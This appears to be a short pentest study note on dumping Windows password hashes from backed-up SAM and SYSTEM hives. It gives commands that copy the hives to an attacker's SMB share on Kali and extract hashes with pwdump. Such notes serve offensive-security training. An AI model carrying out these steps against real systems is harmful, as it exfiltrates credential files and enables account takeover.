**SAM and SYSTEM**
located in `C:\Windows\System32\config`
- locked when Windows is running

1. Backups may be found in `C:\Windows\Repair` or `C:\Windows\System32\config\RegBack`
![](assets/Pasted%20image%2020260607142702.png)

2. Copy files back to Kali
```
copy C:\Windows\Repair\SAM \\<IP>\share\
copy C:\Windows\Repair\SYSTEM \\<IP>\share\
```
![](assets/Pasted%20image%2020260607142755.png)


3. dump hashes with pwdump (pypykatz should work too)
```
python2 pwdump.py SYSTEM SAM
```
![](assets/Pasted%20image%2020260607142914.png)

